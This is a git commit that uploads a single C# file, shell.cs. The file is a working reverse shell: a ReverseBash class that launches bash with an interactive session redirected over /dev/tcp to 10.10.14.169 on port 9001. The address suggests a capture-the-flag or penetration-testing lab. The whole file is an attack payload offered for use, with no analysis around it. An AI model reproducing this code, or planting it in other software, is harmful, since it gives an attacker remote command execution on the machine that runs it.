d60f8cb338dda7b3d06fc57dd7755e5d45e959b3
friday <115765212+peroxidee@users.noreply.github.com>
2024-02-20 12:11:45 -0800

    Add files via upload

---
+++ shell.cs
@@ -0,0 +1,20 @@
+using System;
+using System.Diagnostics;
+
+namespace BackConnect {
+  class ReverseBash {
+	public static void Main(string[] args) {
+	  Process proc = new System.Diagnostics.Process();
+	  proc.StartInfo.FileName = "/bin/bash";
+	  proc.StartInfo.Arguments = "-c \"/bin/bash -i >& /dev/tcp/10.10.14.169/9001 0>&1\"";
+	  proc.StartInfo.UseShellExecute = false;
+	  proc.StartInfo.RedirectStandardOutput = true;
+	  proc.Start();
+
+	  while (!proc.StandardOutput.EndOfStream) {
+		Console.WriteLine(proc.StandardOutput.ReadLine());
+	  }
+	}
+  }
+}
+
